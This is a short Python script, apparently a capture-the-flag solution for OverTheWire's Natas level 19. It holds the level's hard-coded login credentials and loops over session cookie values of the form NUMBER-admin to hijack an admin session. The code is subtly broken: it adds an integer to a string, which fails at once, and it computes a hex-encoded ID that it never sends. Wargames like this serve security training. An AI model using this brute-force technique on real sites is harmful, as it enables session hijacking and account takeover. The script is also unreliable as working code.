#Session Prediction Brute force - Natas 19
# NUMBER-admin 
import requests

url = "http://natas19.natas.labs.overthewire.org/"
auth_variable = ("natas19","tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

print("Running Script")
for i in range(641):
 current_id = str(i+"-admin")
 hex_text = current_id.encode("utf-8").hex() #convert result to ASCII
 cookies_variable = {'PHPSESSID': current_id}
 r = requests.get(url, auth= auth_variable, cookies = cookies_variable)
 if("You are an admin" in r.text):
  print("[:] Admin ID found!")
  print(f"PHPSESSID : {current_id}")
  print(r.text)
  break